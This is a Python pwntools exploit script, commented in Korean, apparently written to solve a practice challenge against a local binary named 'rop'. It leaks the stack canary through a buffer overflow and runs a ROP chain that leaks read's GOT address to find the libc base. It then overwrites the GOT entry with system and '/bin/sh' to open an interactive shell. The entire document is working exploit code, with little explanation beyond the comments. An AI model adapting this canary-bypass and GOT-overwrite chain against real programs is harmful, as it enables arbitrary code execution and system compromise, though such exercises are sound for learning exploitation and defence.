from pwn import *

p = process("./rop")
e = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

leak = b''
leak += b"a" * 57

p.sendafter(b"Buf: ", leak)
p.recvuntil(leak)
canary = b"\x00"
canary += p.recv(7) 
#read함수 절대주소 got에 저장됨


read_got = e.got['read']
puts_plt = e.plt['puts']
read_plt = e.plt['read']
pop_rdi = 0x0000000000401303
pop_rsi_r15 = 0x0000000000401301
ret = 0x000000000040101a
# canary 우회
payload = b''
payload += b"a" * 56 + canary + b"s" * 8



# puts(read_got) // read got에 있는 read함수의 절대 주소 읽어야 함
payload += p64(pop_rdi)  + p64(read_got)
payload += p64(puts_plt) #puts(read_got)


# read(0, read_got, 0x10)   // read_got에 system함수 주소랑 /bin/sh 문자열 삽입
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(16)
payload += p64(read_plt) # plt가 got 가리킴


# system("/bin/sh") // read_plt에 system함수 주소 있음
payload += p64(pop_rdi)
payload += p64(read_got+8) # "/bin/sh"
payload += p64(read_plt)


p.sendafter(b"Buf: ", payload)


# system함수 주소 받기
read = b''
read += p.recv(6)
read += b"\x00" * 2

lb = u64(read)  - libc.symbols["read"]
system = lb + libc.symbols["system"]


# system 주소랑 /bin/sh 쓰기

p.send(p64(system) + b"/bin/sh\x00") # 8byte 맞춰주려고 \x00 추가
p.interactive()